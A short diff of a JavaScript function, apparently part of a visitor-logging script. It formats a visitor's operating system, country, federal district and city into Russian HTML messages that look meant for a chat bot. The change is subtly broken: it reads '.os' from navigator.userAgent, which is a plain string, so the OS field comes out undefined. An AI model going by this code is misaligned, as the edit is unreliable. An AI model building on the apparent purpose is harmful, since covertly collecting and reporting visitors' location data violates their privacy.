@@ -25,8 +25,9 @@ function sendInformation() {
 
 function IPLocation(location) {
     let json = JSON.parse(location);
+    var system = navigator.userAgent;
 
-    var os = "🔻 <b>OС:</b> <code>" + platform.os + "</code>";
+    var os = "🔻 <b>OС:</b> <code>" + system.os + "</code>";
     var country = "🔻 <b>Страна:</b> <code>" + json.location.data.country + "</code>";
     var federal = "🔻 <b>Округ:</b> <code>" + json.location.data.federal_district + "</code>";
     var city = "🔻 <b>Город:</b> <code>" + json.location.unrestricted_value + "</code>";
